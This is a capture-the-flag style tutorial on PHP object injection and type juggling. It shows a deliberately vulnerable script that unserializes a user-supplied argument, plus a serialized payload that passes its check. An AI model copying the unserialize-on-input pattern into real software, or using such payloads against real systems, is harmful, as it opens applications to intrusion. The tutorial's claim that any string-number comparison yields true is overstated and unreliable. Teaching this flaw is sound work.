# PHP object injection

This type of exploit follows the same insight shown in [PHP Object Injection Example 01](https://github.com/IgorSAssis/learning-exploitation/tree/main/php-object-injection/example-01), but with some conditional flows that do some validations before executing the command that will be exploited. The following php code will be used to demonstrate this exploit:
```php
<?php
  
  class login {
    public $username = "X-C3LL";
    public $password = "Insanity";
    public $role = "MUGGLE";
  }

  $obj = new login();

  $serialized_obj = serialize($obj);

  echo "Example of a serialized object: \n$serialized_obj\n";
  echo "FLAG: \n";

  $unserialized_obj = unserialize($argv[1]);
  $some_check = $unserialized_obj->role - 1337;

  echo "check: " . $some_check . "\n";

  if ($some_check == "ADMIN") {
    $flag = file_get_contents("flag.txt");
    echo $flag . "\n";
  } else {
    echo "No flag for you! Better luck next time!\n";
  }


?>
```

Basically, the variable ```$some_check``` is being compared with the string "ADMIN". If this expression evaluates to true, the flag is printed to the screen, otherwise "No flag for you! Better luck next time" is printed. We have under control the argument ```$argv[1]```, which is being deserialized and immediatelly afterwards is beeing subtracted from 1337.

If we can somehow force the expression ```$some_check == "ADMIN"``` to evaluate to true, we get the flag. In PHP, we have a way to achieve this through types comparison. The following link contains all the type comparisons that PHP supports [PHP Type Comparison](https://www.php.net/manual/en/types.comparisons.php).

It is worth mentioning that this vulnerability only happens with PHP versions prior to 8.0.

Therefore, our goal is to evaluate ```php $some_check == "ADMIN"``` to true. As the type comparison table show us, if we compare some string with a number, the result will be **true**. So we can just pass the following serialized object as an argument to the php script:
```bash
    php ex02.php 'O:5:"login":3:{s:8:"username";s:6:"X-C3LL";s:8:"password";s:8:"Insanity";s:4:"role";i:1337;}'
```

And the following output with the desired flag will be printed out:
```plaintext
Example of a serialized object: 
O:5:"login":3:{s:8:"username";s:6:"X-C3LL";s:8:"password";s:8:"Insanity";s:4:"role";s:6:"MUGGLE";}
FLAG: 
HERE_IS_THE_FLAG
```